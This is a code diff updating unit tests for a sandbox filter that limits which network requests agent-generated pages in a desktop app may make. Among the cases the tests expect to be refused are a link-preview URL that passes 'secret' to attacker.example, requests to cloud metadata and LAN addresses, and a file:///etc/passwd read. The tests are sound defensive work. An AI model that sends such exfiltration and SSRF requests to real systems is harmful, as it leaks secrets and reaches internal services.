@@ -1,14 +1,17 @@
 import { describe, expect, it } from "vitest";
-import { agentPageRequestAllowed, isAgentPageUrl } from "./render-frame-network";
+import { isAgentPageUrl } from "../shared/agent-page-url";
+import { agentPageRequestAllowed } from "./render-frame-network";
 
-const daemon = 3042;
+const render = "http://127.0.0.1:3042/api/v1/sessions/p-1/renders/r1";
+const artifact = "http://127.0.0.1:3042/api/v1/sessions/p-1/artifact-files/q3/report.html";
+const inline = "http://ao-inline-artifact.x.localhost:3042/q3/report.html";
 const resolveTo = (address: string, family = 4) => async () => [{ address, family }];
 
 describe("isAgentPageUrl", () => {
 	it("knows the frames that hold agent pages", () => {
-		expect(isAgentPageUrl("http://127.0.0.1:3042/api/v1/sessions/p-1/renders/r1")).toBe(true);
+		expect(isAgentPageUrl(render)).toBe(true);
 		expect(isAgentPageUrl("http://localhost:3042/api/v1/sessions/p-1/artifact-files/q3/report.html")).toBe(true);
-		expect(isAgentPageUrl("http://ao-inline-artifact.x.localhost:3042/q3/report.html")).toBe(true);
+		expect(isAgentPageUrl(inline)).toBe(true);
 	});
 
 	it("leaves the app and everything else alone", () => {
@@ -16,41 +19,55 @@ describe("isAgentPageUrl", () => {
 		expect(isAgentPageUrl("app://renderer/index.html")).toBe(false);
 		expect(isAgentPageUrl("http://127.0.0.1:3042/api/v1/sessions")).toBe(false);
 		expect(isAgentPageUrl("http://ao-preview-artifact.x.localhost:3042/q3/report.html")).toBe(false);
+		expect(isAgentPageUrl("https://docs.example/api/v1/sessions/p-1/renders/r1")).toBe(false);
 		expect(isAgentPageUrl("not a url")).toBe(false);
 	});
 });
 
 describe("agentPageRequestAllowed", () => {
 	it("lets a page load public addresses, data and blob URLs", async () => {
-		expect(await agentPageRequestAllowed("https://cdn.example/chart.js", daemon, resolveTo("93.184.216.34"))).toBe(true);
-		expect(await agentPageRequestAllowed("https://93.184.216.34/x.png", daemon)).toBe(true);
-		expect(await agentPageRequestAllowed("data:image/png;base64,iVBORw0KGgo=", daemon)).toBe(true);
-		expect(await agentPageRequestAllowed("blob:http://ao-inline-artifact.x.localhost:3042/1", daemon)).toBe(true);
+		expect(await agentPageRequestAllowed("https://cdn.example/chart.js", render, resolveTo("93.184.216.34"))).toBe(true);
+		expect(await agentPageRequestAllowed("https://93.184.216.34/x.png", render)).toBe(true);
+		expect(await agentPageRequestAllowed("data:image/png;base64,iVBORw0KGgo=", render)).toBe(true);
+		expect(await agentPageRequestAllowed("blob:http://ao-inline-artifact.x.localhost:3042/1", inline)).toBe(true);
 	});
 
-	it("lets a page reach the daemon, its own files included", async () => {
-		expect(await agentPageRequestAllowed("http://127.0.0.1:3042/api/v1/sessions/p-1/artifact-files/q3/chart.png", daemon)).toBe(true);
-		expect(await agentPageRequestAllowed("http://ao-inline-artifact.x.localhost:3042/q3/data.json", daemon)).toBe(true);
+	it("lets a page load its own files", async () => {
+		expect(await agentPageRequestAllowed(render, render)).toBe(true);
+		expect(await agentPageRequestAllowed("http://127.0.0.1:3042/api/v1/sessions/p-1/artifact-files/q3/chart.png", artifact)).toBe(true);
+		expect(await agentPageRequestAllowed("http://localhost:3042/api/v1/sessions/p-1/artifact-files/data.json", artifact)).toBe(true);
+		expect(await agentPageRequestAllowed("http://ao-inline-artifact.x.localhost:3042/q3/data.json", inline)).toBe(true);
+	});
+
+	it("refuses the daemon's API, which answers a request with no Origin, and other sessions' files", async () => {
+		const linkPreview = "http://127.0.0.1:3042/api/v1/link-preview?url=https://attacker.example/?d=secret";
+		for (const page of [render, artifact, inline]) expect(await agentPageRequestAllowed(linkPreview, page)).toBe(false);
+		expect(await agentPageRequestAllowed("http://127.0.0.1:3042/api/v1/sessions/p-1/renders/r2", render)).toBe(false);
+		expect(await agentPageRequestAllowed("http://127.0.0.1:3042/api/v1/sessions/p-2/artifact-files/a.html", artifact)).toBe(false);
+		expect(await agentPageRequestAllowed("http://ao-inline-artifact.y.localhost:3042/a.html", inline)).toBe(false);
+	});
+
+	it("refuses an inline artifact's frame on its session's preview origin, which the daemon trusts", async () => {
+		expect(await agentPageRequestAllowed("http://ao-preview-artifact.x.localhost:3042/evil.html", inline)).toBe(false);
+		expect(await agentPageRequestAllowed("http://ao-preview.x.localhost:3042/", inline)).toBe(false);
 	});
 
 	it("refuses this computer's other ports and the local network", async () => {
-		expect(await agentPageRequestAllowed("http://127.0.0.1:8888/api", daemon)).toBe(false);
-		expect(await agentPageRequestAllowed("http://localhost:5173/", daemon)).toBe(false);
-		expect(await agentPageRequestAllowed("http://ao-preview.x.localhost:8080/", daemon)).toBe(false);
-		expect(await agentPageRequestAllowed("http://192.168.1.1/cgi-bin/admin", daemon)).toBe(false);
-		expect(await agentPageRequestAllowed("http://[::1]:22/", daemon)).toBe(false);
-		expect(await agentPageRequestAllowed("ws://10.0.0.5:9000/", daemon)).toBe(false);
-		expect(await agentPageRequestAllowed("http://169.254.169.254/latest/meta-data/", daemon)).toBe(false);
+		expect(await agentPageRequestAllowed("http://127.0.0.1:8888/api", render)).toBe(false);
+		expect(await agentPageRequestAllowed("http://localhost:5173/", render)).toBe(false);
+		expect(await agentPageRequestAllowed("http://192.168.1.1/cgi-bin/admin", render)).toBe(false);
+		expect(await agentPageRequestAllowed("http://[::1]:22/", render)).toBe(false);
+		expect(await agentPageRequestAllowed("ws://10.0.0.5:9000/", render)).toBe(false);
+		expect(await agentPageRequestAllowed("http://169.254.169.254/latest/meta-data/", render)).toBe(false);
 	});
 
-	it("refuses a name that resolves to the local network, even on the daemon's port", async () => {
-		expect(await agentPageRequestAllowed("http://router.lan/", daemon, resolveTo("192.168.1.1"))).toBe(false);
-		expect(await agentPageRequestAllowed("http://nas.example:3042/", daemon, resolveTo("10.0.0.2"))).toBe(false);
+	it("refuses a name that resolves to this computer or its network, even on the daemon's port", async () => {
+		expect(await agentPageRequestAllowed("http://router.lan/", render, resolveTo("192.168.1.1"))).toBe(false);
+		expect(await agentPageRequestAllowed("http://localtest.example:3042/api/v1/sessions/p-1/renders/r1", render, resolveTo("127.0.0.1"))).toBe(false);
 	});
 
-	it("refuses loopback when the daemon's port is not known, and other schemes", async () => {
-		expect(await agentPageRequestAllowed("http://127.0.0.1:3042/api/v1/sessions/p-1/renders/r1", undefined)).toBe(false);
-		expect(await agentPageRequestAllowed("file:///etc/passwd", daemon)).toBe(false);
-		expect(await agentPageRequestAllowed("not a url", daemon)).toBe(false);
+	it("refuses other schemes", async () => {
+		expect(await agentPageRequestAllowed("file:///etc/passwd", render)).toBe(false);
+		expect(await agentPageRequestAllowed("not a url", render)).toBe(false);
 	});
 });
